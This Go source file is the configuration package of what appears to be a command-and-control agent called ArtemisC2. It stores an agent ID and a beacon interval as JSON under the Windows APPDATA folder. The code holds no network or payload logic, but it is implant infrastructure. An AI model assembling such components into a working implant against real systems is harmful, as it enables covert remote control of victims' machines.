package config

import (
	"encoding/json"
	"os"
	"path/filepath"
)

type Config struct {
	AgentId        string `json:"agent_id"`
	BeaconInterval int    `json:"beacon_interval"` // in seconds
}

func getConfigPath() string {
	appdata := os.Getenv("APPDATA")
	dir := filepath.Join(appdata, "ArtemisC2")
	return filepath.Join(dir, "cfg")
}

func SaveConfig(cfg *Config) error {
	path := getConfigPath()
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0700); err != nil {
		return err
	}
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	return json.NewEncoder(f).Encode(cfg)
}

func LoadConfig() (*Config, error) {
	var cfg Config
	path := getConfigPath()
	f, err := os.Open(path)
	if err != nil {
		return &cfg, err
	}
	defer f.Close()
	err = json.NewDecoder(f).Decode(&cfg)
	return &cfg, err
}
